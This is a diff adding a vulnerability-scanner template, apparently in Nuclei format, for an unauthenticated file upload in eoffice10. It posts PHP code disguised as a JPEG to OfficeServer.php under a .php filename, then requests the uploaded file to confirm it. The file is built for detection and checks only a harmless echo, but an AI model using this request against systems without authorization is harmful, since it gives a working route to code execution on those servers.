@@ -1,0 +1,41 @@
+id: poc-yaml-eoffice10-file-upload
+
+info:
+  name: poc-yaml-eoffice10-file-upload
+  author: xiaobaicai
+  severity: critical
+  tags: xray-converted,fileupload,ct-456777
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+        Content-Type: image/jpeg
+        
+        <?php echo {{rand_int(1000, 9999)}};?>
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+        Content-Disposition: form-data; name="FormData"
+        
+        {"USERNAME":"","RECORDID":"undefined","OPTION":"SAVEFILE","FILENAME":"{{rand_base(8)}}.php"}
+        ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /eoffice10/server/public/iWebOffice2015/Document/{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
